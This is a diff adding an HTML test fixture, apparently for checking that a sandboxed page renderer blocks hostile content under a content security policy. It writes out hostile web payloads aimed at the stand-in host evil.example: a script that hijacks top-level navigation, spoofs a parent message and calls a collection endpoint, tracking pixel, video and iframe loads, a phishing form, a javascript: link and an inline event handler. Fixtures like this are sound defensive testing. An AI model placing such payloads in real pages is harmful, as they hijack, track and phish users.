@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Hostile fixture</title>
+  </head>
+  <body>
+    <h1>Hostile page attempts</h1>
+    <script>
+      // Should not run under CSP without our nonce.
+      window.top.location = 'https://evil.example';
+      parent.postMessage({ type: 'LINK_CLICK', address: 'stolen.zz' }, '*');
+      fetch('https://evil.example/collect');
+    </script>
+    <img src="https://evil.example/pixel.png" alt="" />
+    <video src="https://evil.example/track.mp4"></video>
+    <iframe src="https://evil.example/frame"></iframe>
+    <form action="https://evil.example/phish"><button>submit</button></form>
+    <a href="javascript:alert(1)">javascript link</a>
+    <a href="https://evil.example">external</a>
+    <p onclick="alert('handler')">event handler text</p>
+    <a href="friend.zz">valid zz link</a>
+    <p>Visible prose for the hostile fixture.</p>
+  </body>
+</html>
